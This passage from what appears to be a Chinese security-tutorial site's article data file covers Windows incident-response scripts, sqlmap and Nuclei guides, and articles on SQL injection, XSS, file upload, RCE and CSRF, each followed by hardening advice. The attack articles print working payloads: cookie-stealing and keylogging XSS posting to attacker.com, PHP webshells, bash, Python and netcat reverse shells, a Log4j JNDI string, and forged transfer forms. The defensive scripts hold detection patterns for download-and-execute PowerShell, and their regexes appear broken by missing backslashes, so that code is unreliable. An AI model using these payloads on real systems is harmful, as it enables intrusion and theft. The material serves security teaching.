    "HKLM:SoftwareMicrosoftWindowsCurrentVersionRunOnce",
    "HKCU:SoftwareMicrosoftWindowsCurrentVersionRun",
    "HKCU:SoftwareMicrosoftWindowsCurrentVersionRunOnce",
    "HKLM:SoftwareMicrosoftWindowsCurrentVersionRunServices",
    "HKLM:SoftwareMicrosoftWindowsCurrentVersionRunServicesOnce"
)

foreach ($key in $startupKeys) {
    if (Test-Path $key) {
        Write-Host "\`n  $key :"
        Get-ItemProperty $key | Select-Object * -ExcludeProperty PS* | ForEach-Object {
            $_.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } | ForEach-Object {
                Write-Host "    $($_.Name): $($_.Value)"
            }
        }
    }
}

# 计划任务
Write-Host "\`n[+] 异常计划任务:"
Get-ScheduledTask | Where-Object {
    $_.State -ne "Disabled" -and
    $_.TaskPath -notmatch "Microsoft" -and
    $_.Actions.Execute -notmatch "svchost|explorer"
} | Select-Object TaskName, TaskPath,
    @{N='Action';E={$_.Actions.Execute}},
    @{N='LastRunTime';E={(Get-ScheduledTaskInfo -TaskName $_.TaskName -ErrorAction SilentlyContinue).LastRunTime}} |
    Format-Table -AutoSize

# === 阶段5：服务排查 ===
Write-Host "\`n[*] ===== 异常服务 =====" -ForegroundColor Cyan
Get-CimInstance Win32_Service | Where-Object {
    $_.PathName -notmatch "System32|SysWOW64|Windows" -and
    $_.StartMode -eq "Auto"
} | Select-Object Name, DisplayName, PathName, StartMode, State |
    Format-Table -AutoSize

# === 阶段6：日志分析 ===
Write-Host "\`n[*] ===== 关键安全事件 =====" -ForegroundColor Cyan

# 登录失败事件
Write-Host "[+] 最近登录失败事件:"
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 20 -ErrorAction SilentlyContinue |
    Select-Object TimeCreated, @{N='User';E={$_.Properties[5].Value}},
        @{N='Source';E={$_.Properties[19].Value}} |
    Format-Table -AutoSize

# 新用户创建事件
Write-Host "[+] 新用户创建事件 (Event ID 4720):"
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4720} -ErrorAction SilentlyContinue |
    Where-Object { $_.TimeCreated -gt (Get-Date).AddDays(-30) } |
    Select-Object TimeCreated, @{N='CreatedUser';E={$_.Properties[0].Value}},
        @{N='Creator';E={$_.Properties[4].Value}} |
    Format-Table -AutoSize

# PowerShell 日志
Write-Host "[+] 异常 PowerShell 模块加载:"
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} -MaxEvents 50 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match "Invoke-Expression|IEX|DownloadString|Net.WebClient" } |
    Select-Object TimeCreated, @{N='ScriptBlock';E={$_.Properties[2].Value}} |
    Format-Table -AutoSize
\`\`\`

\`\`\`python
# Windows 事件日志分析脚本

import subprocess
import json
import re
from collections import Counter
from datetime import datetime, timedelta

class WindowsIRAnalyzer:
    """
    Windows 事件日志 IR 分析器
    """

    # 重要事件 ID
    CRITICAL_EVENTS = {
        4624: "登录成功",
        4625: "登录失败",
        4648: "明文凭据登录",
        4672: "特殊权限分配",
        4720: "用户账户创建",
        4722: "用户账户启用",
        4724: "密码重置尝试",
        4726: "用户账户删除",
        4728: "安全组成员添加",
        4732: "本地组成员添加",
        4756: "通用组成员添加",
        4768: "Kerberos TGT 请求",
        4769: "Kerberos 服务票据请求",
        4776: "NTLM 认证",
        5140: "网络共享访问",
        5156: "Windows 防火墙允许连接",
    }

    def __init__(self, hostname="localhost"):
        self.hostname = hostname

    def get_events(self, log_name, event_id=None, hours=24, max_events=1000):
        """通过 wevtutil 获取事件"""
        query = f"wevtutil qe {log_name} /c:{max_events} /f:text /rd:true"

        if event_id:
            query += f" /q:"*[System[(EventID={event_id})]]""

        try:
            result = subprocess.check_output(
                ["powershell", "-Command", query],
                text=True,
                timeout=60
            )
            return result
        except Exception as e:
            return f"Error: {e}"

    def analyze_logon_events(self, hours=24):
        """分析登录事件"""
        findings = []

        # 4624 - 登录成功
        login_success = self.get_events("Security", 4624, hours)
        # 4625 - 登录失败
        login_failures = self.get_events("Security", 4625, hours)

        # 统计来源 IP
        source_ips = re.findall(r'IpAddress:s+(d+.d+.d+.d+)', login_failures)
        ip_counter = Counter(source_ips)

        # 检测暴力破解
        for ip, count in ip_counter.most_common(10):
            if count > 50:
                findings.append({
                    "type": "BRUTE_FORCE",
                    "severity": "HIGH",
                    "detail": f"来源 {ip} 在 {hours} 小时内有 {count} 次登录失败",
                    "recommendation": "考虑封禁该 IP，检查账户是否被锁定"
                })

        # 检测异常时间登录
        night_logins = re.findall(r'时间:s+(d{4}-d{2}-d{2}Td{2}:d{2}:d{2})', login_success)
        for time_str in night_logins:
            try:
                hour = int(time_str.split("T")[1].split(":")[0])
                if 0 <= hour <= 6:
                    findings.append({
                        "type": "ABNORMAL_LOGON_TIME",
                        "severity": "MEDIUM",
                        "detail": f"凌晨登录: {time_str}",
                        "recommendation": "确认是否为正常操作"
                    })
            except:
                pass

        return findings

    def analyze_powershell_events(self, hours=24):
        """分析 PowerShell 事件"""
        findings = []

        # 4104 - Script Block Logging
        events = self.get_events("Microsoft-Windows-PowerShell/Operational", 4104, hours)

        suspicious_patterns = [
            (r'Invoke-Expression', "动态代码执行"),
            (r'IEXs+(', "IEX 调用"),
            (r'Net.WebClient.*DownloadString', "远程脚本下载"),
            (r'Net.Sockets.TCPClient', "Socket 连接"),
            (r'Add-Type.*-TypeDefinition.*DllImport', "P/Invoke 调用"),
            (r'Start-Process.*-WindowStyles+Hidden', "隐藏进程启动"),
            (r'New-Object.*-ComObjects+WScript.Shell', "WScript COM 对象"),
            (r'base64', "Base64 编码命令"),
        ]

        for pattern, desc in suspicious_patterns:
            if re.search(pattern, events, re.IGNORECASE):
                findings.append({
                    "type": "POWERSHELL_SUSPICIOUS",
                    "severity": "HIGH",
                    "detail": f"检测到可疑 PowerShell 模式: {desc}",
                    "recommendation": "检查 PowerShell 脚本来源和执行上下文"
                })

        return findings

    def generate_timeline(self, hours=48):
        """生成事件时间线"""
        events = []

        # 获取多个日志源
        logs = [
            ("Security", 4624), ("Security", 4625),
            ("Security", 4720), ("Security", 4732),
            ("System", 7045),  # 新服务安装
        ]

        for log_name, event_id in logs:
            raw = self.get_events(log_name, event_id, hours, 200)
            # 提取时间戳
            timestamps = re.findall(r'时间:s+(d{4}-d{2}-d{2}Td{2}:d{2}:d{2})', raw)
            for ts in timestamps:
                events.append({
                    "time": ts,
                    "log": log_name,
                    "event_id": event_id,
                    "description": self.CRITICAL_EVENTS.get(event_id, "Unknown")
                })

        # 按时间排序
        events.sort(key=lambda x: x["time"], reverse=True)
        return events

    def generate_report(self):
        """生成完整 IR 报告"""
        report = {
            "hostname": self.hostname,
            "timestamp": datetime.now().isoformat(),
            "findings": {
                "logon_anomalies": self.analyze_logon_events(),
                "powershell_suspicious": self.analyze_powershell_events(),
                "timeline": self.generate_timeline()
            }
        }

        # 统计
        total_findings = sum(
            len(v) for k, v in report["findings"].items() if isinstance(v, list)
        )
        critical_count = sum(
            1 for v in report["findings"].values()
            if isinstance(v, list)
            for item in v
            if isinstance(item, dict) and item.get("severity") in ["CRITICAL", "HIGH"]
        )

        report["summary"] = {
            "total_findings": total_findings,
            "critical": critical_count,
            "status": "需要立即响应" if critical_count > 0 else "需要审查"
        }

        return report

if __name__ == "__main__":
    analyzer = WindowsIRAnalyzer()
    report = analyzer.generate_report()
    print(json.dumps(report, indent=2, ensure_ascii=False, default=str))
\`\`\`

## 安全加固

1. **账户安全**
   - 启用多因素认证（MFA），特别是管理员账户
   - 实施 LAPS 管理本地管理员密码
   - 禁用内置管理员账户（Administrator），创建自定义管理员账户
   - 配置账户锁定策略：5次失败后锁定30分钟
   - 启用 Credential Guard 防止凭据窃取

2. **日志与监控**
   - 启用高级审计策略：登录/注销、特权使用、账户管理
   - 启用 PowerShell 日志：Module Logging、Script Block Logging、Transcription
   - 部署 Sysmon 增强日志能力
   - 集中日志到 SIEM 并配置实时告警

3. **端点防护**
   - 部署 EDR 解决方案（Microsoft Defender for Endpoint / CrowdStrike）
   - 启用 Windows Defender 实时保护和云查杀
   - 配置 ASR（Attack Surface Reduction）规则
   - 启用 Controlled Folder Access 防勒索软件

4. **网络防护**
   - 启用 Windows 防火墙，限制入站/出站规则
   - 启用 SMB 签名和加密
   - 配置 Windows Defender Firewall with Advanced Security
   - 部署网络级别认证（NLA）用于 RDP
    `
  },
  // 工具手册 - 补充
  {
    slug: 'sqlmap-guide',
    title: 'SQLmap 使用指南',
    date: '2026-05-30',
    category: 'tools',
    subcategory: 'sqlmap',
    tags: ['工具', 'SQLmap', 'SQL注入'],
    summary: 'SQLmap 自动化 SQL 注入检测和利用工具。',
    content: `
## 基本用法

\`\`\`bash
# 检测注入
sqlmap -u "http://target/?id=1"

# 获取数据库
sqlmap -u "http://target/?id=1" --dbs

# 获取表
sqlmap -u "http://target/?id=1" -D mydb --tables

# 获取数据
sqlmap -u "http://target/?id=1" -D mydb -T users --dump
\`\`\`

## POST 注入

\`\`\`bash
# 从 Burp 导出请求
sqlmap -r request.txt

# 指定参数
sqlmap -u "http://target/login" --data="user=admin&pass=123" -p user

# 指定方法
sqlmap -u "http://target/login" --data="user=admin&pass=123" --method=POST
\`\`\`

## 高级选项

\`\`\`bash
# 执行系统命令
sqlmap -u "http://target/?id=1" --os-shell

# 读取文件
sqlmap -u "http://target/?id=1" --file-read="/etc/passwd"

# 写入文件
sqlmap -u "http://target/?id=1" --file-write="shell.php" --file-dest="/var/www/shell.php"

# 使用代理
sqlmap -u "http://target/?id=1" --proxy="http://127.0.0.1:8080"

# 绕过WAF
sqlmap -u "http://target/?id=1" --tamper=space2comment,between --random-agent
\`\`\`

## Tamper 脚本

\`\`\`bash
# 常用tamper
space2comment     # 空格→注释
between           # >→BETWEEN, =→LIKE
charencode        # URL编码
randomcase        # 随机大小写
unionall          # UNION ALL替换UNION
\`\`\`

## 输出控制

\`\`\`bash
# 保存日志
sqlmap -u "http://target/?id=1" --output-dir=/tmp/sqlmap

# 只检测不利用
sqlmap -u "http://target/?id=1" --batch --level=1

# 指定数据库类型
sqlmap -u "http://target/?id=1" --dbms=mysql
\`\`\`
    `
  },
  {
    slug: 'nuclei-guide',
    title: 'Nuclei 漏洞扫描指南',
    date: '2026-05-28',
    category: 'tools',
    subcategory: 'nuclei',
    tags: ['工具', 'Nuclei', '漏洞扫描'],
    summary: 'Nuclei 基于模板的快速漏洞扫描器。',
    content: `
## 基本用法

\`\`\`bash
# 扫描单个目标
nuclei -u http://target.com

# 批量扫描
nuclei -l urls.txt

# 指定模板
nuclei -u http://target.com -t cves/

# 输出结果
nuclei -u http://target.com -o results.txt
\`\`\`

## 模板管理

\`\`\`bash
# 更新模板
nuclei -update-templates

# 查看模板
nuclei -tl

# 按标签扫描
nuclei -u http://target.com -tags cve,rce

# 按严重程度
nuclei -u http://target.com -severity critical,high
\`\`\`

## 高级用法

\`\`\`bash
# 使用代理
nuclei -u http://target.com -proxy http://127.0.0.1:8080

# 并发控制
nuclei -l urls.txt -c 50

# 排除模板
nuclei -u http://target.com -exclude-tags dos

# 自定义模板
nuclei -u http://target.com -t custom-template.yaml
\`\`\`

## 自定义模板

\`\`\`yaml
id: custom-sqli
info:
  name: Custom SQL Injection
  severity: high
  description: Detects SQL injection

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?id=1'"
    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "mysql"
        condition: or
\`\`\`

## 常用参数

| 参数 | 说明 |
|------|------|
| -u | 目标URL |
| -l | 目标列表 |
| -t | 模板目录 |
| -severity | 严重程度 |
| -tags | 标签过滤 |
| -proxy | 代理 |
| -o | 输出文件 |
| -json | JSON格式输出 |
    `
  },
  // Web安全
  {
    slug: 'sql-injection',
    title: 'SQL 注入漏洞详解',
    date: '2026-06-20',
    category: 'websec',
    subcategory: 'sqli',
    tags: ['Web安全', 'SQL注入', '注入'],
    summary: 'SQL 注入原理、类型、绕过技巧和防御方案。',
    content: `
## 什么是 SQL 注入

SQL 注入是通过在输入中插入恶意 SQL 语句，使后端数据库执行非预期操作的攻击方式。

## SQL 注入流程

\`\`\`
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ 1. 入口发现   │───>│ 2. 注入判断   │───>│ 3. 类型判断   │───>│ 4. 数据提取   │
│ 参数/头部/Cookie│    │ 逻辑/报错回显 │    │ Union/布尔/时间│    │ 脱库/RCE     │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
       │                   │                   │                    │
  表单/URL/API        单引号/逻辑测试      联合查询/报错注入    数据库名/表/字段
  HTTP头部注入        布尔盲注/时间盲注    堆叠查询            敏感数据
\`\`\`

## 常见类型

### 1. Union 注入

\`\`\`sql
-- 判断列数
' ORDER BY 1-- -
' ORDER BY 5-- -  -- 报错说明有4列

-- 联合查询
' UNION SELECT 1,2,3,4-- -
' UNION SELECT 1,database(),3,4-- -
' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
\`\`\`

### 2. 报错注入

\`\`\`sql
-- extractvalue
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- -

-- updatexml
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- -

-- floor
' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
\`\`\`

### 3. 布尔盲注

\`\`\`sql
-- 判断数据库名长度
' AND length(database())=8-- -

-- 逐字符判断
' AND ascii(substr(database(),1,1))>100-- -
' AND ascii(substr(database(),1,1))>115-- -
\`\`\`

### 4. 时间盲注

\`\`\`sql
' AND IF(ascii(substr(database(),1,1))>115, sleep(3), 0)-- -
' AND IF(length(database())=8, sleep(3), 0)-- -
\`\`\`

### 5. 堆叠注入

\`\`\`sql
'; DROP TABLE users;-- -
'; INSERT INTO users VALUES('admin','hacked');-- -
\`\`\`

## 绕过技巧

\`\`\`sql
-- 大小写绕过
SeLeCt

-- 双写绕过
selselectect

-- 内联注释
/*!50000SELECT*/

-- 空格绕过
/**/  %09  %0a  %0b  %0c  %0d

-- 等号绕过
' AND '1'<'2
' AND 1 LIKE 1
\`\`\`

## 实战案例

### 案例1：登录绕过

\`\`\`sql
-- 用户名框输入
admin' OR '1'='1'/*
-- 密码框输入
anything

-- 实际执行SQL
SELECT * FROM users WHERE username='admin' OR '1'='1'/*' AND password='anything'
\`\`\`

### 案例2：使用 SQLmap 自动化

\`\`\`bash
# 基本检测
sqlmap -u "http://target/?id=1" --batch

# POST注入
sqlmap -u "http://target/login" --data="user=admin&pass=123" -p user --batch

# 获取所有数据库
sqlmap -u "http://target/?id=1" --dbs --batch

# 获取指定表数据
sqlmap -u "http://target/?id=1" -D mydb -T users --dump --batch

# 绕过WAF
sqlmap -u "http://target/?id=1" --tamper=space2comment,between --random-agent --batch

# 执行系统命令
sqlmap -u "http://target/?id=1" --os-shell --batch
\`\`\`

## 安全加固

1. **使用参数化查询**：使用预编译语句（Prepared Statement），禁止字符串拼接SQL
2. **输入验证**：对输入做白名单校验，过滤特殊字符
3. **最小权限**：数据库账户只授予必要的最小权限
4. **错误处理**：不要向用户暴露详细数据库错误信息
5. **使用 ORM 框架**：使用 SQLAlchemy、MyBatis 等框架的参数化接口
6. **部署 WAF**：使用 ModSecurity、云 WAF 拦截 SQL 注入特征
7. **定期扫描**：使用 SQLmap、Nuclei 等工具定期进行安全扫描
8. **敏感数据加密**：对数据库中的敏感字段加密存储
    `
  },
  {
    slug: 'xss-attack',
    title: 'XSS 跨站脚本攻击详解',
    date: '2026-06-19',
    category: 'websec',
    subcategory: 'xss',
    tags: ['Web安全', 'XSS', '跨站脚本'],
    summary: 'XSS 漏洞原理、类型、绕过技巧和防御方案。',
    content: `
## 什么是 XSS

XSS（Cross-Site Scripting）跨站脚本攻击，攻击者在网页中注入恶意脚本，当用户浏览时执行。

## XSS 攻击流程

\`\`\`
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ 1. 注入点发现 │───>│ 2. Payload   │───>│ 3. 触发执行   │───>│ 4. 数据窃取   │
│ 搜索/评论/URL │    │ 构造恶意脚本  │    │ 用户浏览器执行 │    │ Cookie/Token  │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
       │                   │                   │                    │
  输入点/输出点         script/alert/img     反射/存储/DOM        会话劫持/钓鱼
  HTML/JS上下文         onerror/onload       self/webpack        键盘记录/重定向
\`\`\`

## 常见类型

### 1. 反射型 XSS

\`\`\`html
# URL参数直接输出到页面
https://target.com/search?q=<script>alert(1)</script>

# 服务器端代码（错误示例）
echo "搜索结果: " . $_GET['q'];
\`\`\`

### 2. 存储型 XSS

\`\`\`html
# 评论区注入恶意脚本
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">

# 持久化存储，每个访问者都会执行
\`\`\`

### 3. DOM 型 XSS

\`\`\`javascript
// 前端JavaScript直接操作DOM
document.getElementById('output').innerHTML = location.hash.slice(1);

# URL
https://target.com/#<img src=x onerror=alert(1)>
\`\`\`

## 常见绕过技巧

\`\`\`html
# 大小写混合
<ScRiPt>alert(1)</sCrIpT>

# 双写标签
<scrscriptipt>alert(1)</scrscriptipt>

# 事件处理
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>

# 编码绕过
<script>eval(atob('YWxlcnQoMSk='))</script>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

# 无括号
<img src=x onerror=alert\`1\`>

# 无分号
<script>alert(1)</script>

# 使用javascript伪协议
<a href="javascript:alert(1)">click</a>
\`\`\`

## 实战案例

### 案例1：窃取用户 Cookie

\`\`\`javascript
// Payload
<script>
new Image().src="https://attacker.com/steal?c="+document.cookie;
</script>

// 攻击者服务器记录
// GET /steal?c=session_id=abc123;token=xyz789
\`\`\`

### 案例2：XSS 获取键盘记录

\`\`\`javascript
// 注入键盘记录脚本
document.onkeypress=function(e){
    new Image().src="https://attacker.com/keylog?k="+e.key;
}
\`\`\`

### 案例3：使用 XSStrike 自动化检测

\`\`\`bash
# 安装
git clone https://github.com/s0md3v/XSStrike
cd XSStrike
pip install -r requirements.txt

# 检测
python xsstrike.py -u "http://target.com/search?q=test"

# POST请求检测
python xsstrike.py -u "http://target.com/comment" --data "comment=test"
\`\`\`

### 案例4：CSP 绕过

\`\`\`html
# 如果CSP允许 cdn.jsdelivr.net
<script src="https://cdn.jsdelivr.net/npm/xss@0.3.8/dist/xss.min.js"></script>
<script>xss.innerHTML=xss.filterXSS(location.hash.slice(1))</script>
\`\`\`

## 安全加固

1. **输出编码**：根据上下文（HTML/JS/URL/CSS）进行适当编码
2. **使用 CSP**：设置 Content-Security-Policy，限制脚本来源
3. **输入验证**：白名单过滤，拒绝恶意标签和事件属性
4. **HttpOnly Cookie**：设置 HttpOnly 标志，防止 JavaScript 读取 Cookie
5. **使用安全框架**：React/Vue 等框架默认对输出进行转义
6. **DOMPurify**：对用户输入的 HTML 使用 DOMPurify 消毒
7. **X-XSS-Protection**：启用浏览器内置 XSS 过滤器
8. **定期扫描**：使用 XSStrike、Nuclei 等工具定期检测
    `
  },
  {
    slug: 'file-upload',
    title: '文件上传漏洞详解',
    date: '2026-06-18',
    category: 'websec',
    subcategory: 'upload',
    tags: ['Web安全', '文件上传', 'Webshell'],
    summary: '文件上传漏洞原理、绕过技巧和防御方案。',
    content: `
## 什么是文件上传漏洞

当服务器对用户上传的文件类型、内容未做严格校验时，攻击者可上传恶意文件（如 Webshell）获取服务器控制权。

## 攻击流程

\`\`\`
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ 1. 上传点发现 │───>│ 2. 绕过校验   │───>│ 3. 文件解析   │───>│ 4. 代码执行   │
│ 表单/API端点  │    │ 前端/后端检测 │    │ 服务器解析执行 │    │ RCE/数据窃取  │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
       │                   │                   │                    │
  头像/附件/文档      扩展名/MIME/内容     Apache/Nginx解析      Webshell管理
  编辑器上传         双写/截断/竞争       文件包含触发          反弹Shell
\`\`\`

## 常见绕过技巧

### 1. 扩展名绕过

\`\`\`
.php → .php3 .php5 .phtml .pht .phps .phar
.jsp → .jspx .jspa .jsw .jsv
.asp → .asa .cer .cdx
大小写：.PhP .pHP .PHP
双写：.pphphp
\`\`\`

### 2. MIME 类型绕过

\`\`\`http
Content-Type: image/png
# 修改为合法MIME但保留.php扩展名
\`\`\`

### 3. 文件头/内容绕过

\`\`\`php
# 图片马 - 在图片文件开头添加PHP代码
GIF89a<?php system($_GET['cmd']); ?>

# 或在EXIF信息中嵌入
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
\`\`\`

### 4. .htaccess 绕过

\`\`\`apache
# 上传.htaccess文件，让服务器解析所有文件为PHP
AddType application/x-httpd-php .jpg .png .gif
\`\`\`

### 5. 竞争条件绕过

\`\`\`
# 先上传Webshell，后删除
# 利用上传和删除之间的时间差访问Webshell
# 使用多线程同时上传和访问
\`\`\`

## 实战案例

### 案例1：绕过前端验证

\`\`\`javascript
// 前端验证代码
function checkFile() {
    var ext = document.getElementById('file').value.split('.').pop();
    if (['jpg','png','gif'].indexOf(ext) === -1) {
        alert('只允许图片');
        return false;
    }
    return true;
}

// 绕过方式：直接用Burp截获请求修改文件名
// 或禁用JavaScript
\`\`\`

### 案例2：绕过后端验证上传Webshell

\`\`\`http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php5"
Content-Type: image/jpeg

GIF89a<?php system($_POST['cmd']); ?>
------WebKitFormBoundary--
\`\`\`

### 案例3：利用文件包含执行

\`\`\`php
# 如果存在文件包含漏洞
# 上传图片马：image.jpg 包含 <?php system($_GET['cmd']); ?>

# 通过包含执行
http://target.com/index.php?page=upload/image.jpg&cmd=whoami
\`\`\`

### 案例4：使用上传检测工具

\`\`\`bash
# 使用.upload-labs 靶场练习
docker pull c0ny1/upload-labs
docker run -d -p 8080:80 c0ny1/upload-labs

# 使用文件上传绕过脚本
python upload_bypass.py -u http://target.com/upload -f shell.php
\`\`\`

## 安全加固

1. **白名单限制扩展名**：只允许上传明确允许的文件类型
2. **重命名文件**：上传后使用随机文件名，不保留原始文件名
3. **禁止执行权限**：上传目录设置为不可执行（Apache: RemoveHandler）
4. **文件内容检测**：使用 getimagesize() 等检查文件真实内容
5. **独立存储**：上传文件存储在独立域名/CDN，不在主站目录
6. **文件大小限制**：限制上传文件大小，防止DoS
7. **二次渲染**：使用图片处理库重新渲染图片，清除嵌入代码
8. **WAF 拦截**：检测恶意文件上传请求
    `
  },
  {
    slug: 'rce-vulnerability',
    title: '远程代码执行漏洞详解',
    date: '2026-06-17',
    category: 'websec',
    subcategory: 'rce',
    tags: ['Web安全', 'RCE', '命令执行'],
    summary: '远程代码执行漏洞原理、利用方式和防御方案。',
    content: `
## 什么是 RCE

RCE（Remote Code Execution）远程代码执行，攻击者可在目标服务器上执行任意命令或代码。

## 攻击流程

\`\`\`
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ 1. 注入点发现 │───>│ 2. 命令注入   │───>│ 3. 代码执行   │───>│ 4. 权限维持   │
│ 参数/函数调用  │    │ 拼接系统命令  │    │ 获取命令执行  │    │ 横向渗透     │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
       │                   │                   │                    │
  用户输入传入命令      管道符/反引号         whoami/id            反弹Shell
  危险函数调用         $()  换行符          cat /etc/passwd      写入Webshell
\`\`\`

## 常见触发场景

### PHP 危险函数

\`\`\`php
system()        exec()          passthru()
shell_exec()    popen()         proc_open()
pcntl_exec()    eval()          assert()
\`\`\`

### Python 危险函数

\`\`\`python
os.system()     os.popen()      subprocess.call()
exec()          eval()          __import__()
\`\`\`

## 命令注入技巧

\`\`\`bash
# 管道符
; ls
| ls
|| ls
&& ls

# 反引号
\`ls\`

# $() 替换
$(ls)

# 换行符
%0a ls

# 空格绕过
\${IFS}
{cat,/etc/passwd}
cat<>/etc/passwd
\`\`\`

## 实战案例

### 案例1：ping 功能命令注入

\`\`\`php
// 后端代码
<?php
$host = $_GET['host'];
$output = shell_exec("ping -c 4 " . $host);
echo "<pre>$output</pre>";
?>

// 攻击
http://target.com/ping.php?host=127.0.0.1;cat /etc/passwd
http://target.com/ping.php?host=127.0.0.1|bash -i >& /dev/tcp/attacker.com/4444 0>&1
\`\`\`

### 案例2：反弹 Shell

\`\`\`bash
# Bash反弹Shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Python反弹Shell
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat
nc -e /bin/sh attacker.com 4444
\`\`\`

### 案例3：Log4j RCE (CVE-2021-44228)

\`\`\`bash
# JNDI注入
\${jndi:ldap://attacker.com:1389/Exploit}

# 使用 JNDIExploit 启动恶意LDAP服务
java -jar JNDIExploit.jar -i attacker.com

# 触发漏洞
curl -H "User-Agent: \${jndi:ldap://attacker.com:1389/Basic/Command/whoami}" http://target.com/
\`\`\`

### 案例4：使用工具自动化检测

\`\`\`bash
# Commix - 命令注入自动化工具
python commix.py --url="http://target.com/vuln.php?cmd=whoami"

# 列出所有注入点
python commix.py --url="http://target.com/vuln.php?cmd=whoami" --level=3

# 获取交互Shell
python commix.py --url="http://target.com/vuln.php?cmd=whoami" --os-cmd
\`\`\`

## 安全加固

1. **避免调用危险函数**：不要将用户输入直接传入 system/exec 等函数
2. **使用白名单**：对用户输入做严格白名单校验
3. **使用参数列表**：使用 escapeshellarg() 或参数数组传递命令
4. **最小权限运行**：Web 应用使用低权限用户运行
5. **禁用危险函数**：通过 disable_functions 禁用不必要的系统函数
6. **输入过滤**：过滤管道符、分号、反引号等 shell 特殊字符
7. **使用沙箱**：在 Docker 容器或 chroot 环境中执行用户相关操作
8. **WAF 拦截**：检测命令注入特征流量
    `
  },
  {
    slug: 'csrf-attack',
    title: 'CSRF 跨站请求伪造详解',
    date: '2026-06-16',
    category: 'websec',
    subcategory: 'csrf',
    tags: ['Web安全', 'CSRF', '请求伪造'],
    summary: 'CSRF 漏洞原理、攻击方式和防御方案。',
    content: `
## 什么是 CSRF

CSRF（Cross-Site Request Forgery）跨站请求伪造，攻击者诱导已登录用户在不知情的情况下执行非预期操作。

## 攻击流程

\`\`\`
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ 1. 用户登录   │───>│ 2. 访问恶意页 │───>│ 3. 自动发请求 │───>│ 4. 操作执行   │
│ 获取Cookie    │    │ 钓鱼/ XSS    │    │ 携带用户凭证  │    │ 转账/改密码   │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
       │                   │                   │                    │
  浏览器保存Cookie      恶意页面/邮件        表单/JSON/AJAX      资金操作/账号操作
  Session认证          iframe/图片标签       跨域请求自动携带     修改资料/删除数据
\`\`\`

## 常见攻击方式

### 1. 表单自动提交

\`\`\`html
<!-- 恶意页面 -->
<body onload="document.getElementById('csrf-form').submit()">
<form id="csrf-form" action="https://target.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
</form>
</body>
\`\`\`

### 2. 图片标签触发 GET 请求

\`\`\`html
<!-- 修改用户资料 -->
<img src="https://target.com/api/user/update?email=attacker@evil.com" style="display:none">
\`\`\`

### 3. AJAX 请求

\`\`\`javascript
// 使用 XMLHttpRequest
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/transfer", true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(JSON.stringify({to: "attacker", amount: 10000}));

// 使用 fetch API
fetch("https://target.com/api/transfer", {
    method: "POST",
    credentials: "include",
    body: JSON.stringify({to: "attacker", amount: 10000})
});
\`\`\`

## 实战案例

### 案例1：银行转账 CSRF

\`\`\`html
<!-- 攻击者构造的页面 -->
<html>
<body>
<h1>恭喜你中奖了！</h1>
<iframe style="display:none" src="https://bank.com/transfer?to=attacker&amount=50000&memo=prize"></iframe>
</body>
</html>
\`\`\`

### 案例2：修改管理员密码

\`\`\`html
<!-- 利用管理员点击 -->
<form method="POST" action="https://admin.target.com/change-password">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="hidden" name="confirm" value="hacked123">
</form>
<script>document.forms[0].submit();</script>
\`\`\`

### 案例3：CSRF Token 伪造检测

\`\`\`python
import requests

# 检查是否存在CSRF Token
session = requests.Session()
r = session.get("https://target.com/transfer")

# 检查表单中是否有隐藏的token字段
from bs4 import BeautifulSoup
soup = BeautifulSoup(r.text, 'html.parser')
token_input = soup.find('input', {'name': 'csrf_token'})

if token_input:
    print(f"存在CSRF Token: {token_input['value']}")
else:
    print("不存在CSRF Token，可能存在CSRF漏洞")
\`\`\`

### 案例4：SameSite Cookie 绕过

\`\`\`
# 如果Cookie没有设置SameSite属性，可以跨站携带
# Chrome 80+ 默认 SameSite=Lax

# 绕过方式：
# 1. 使用子域名
# 2. 使用 top-level navigation (GET请求)
# 3. 利用旧版浏览器
\`\`\`

## 安全加固

1. **CSRF Token**：在表单中添加随机 Token，服务端验证
2. **SameSite Cookie**：设置 Cookie 的 SameSite 属性为 Strict 或 Lax
3. **Referer/Origin 校验**：验证请求来源是否合法
4. **二次验证**：敏感操作（转账/改密码）要求输入密码或验证码
5. **自定义请求头**：使用 XMLHttpRequest/Fetch 添加自定义头（如 X-CSRF-Token）
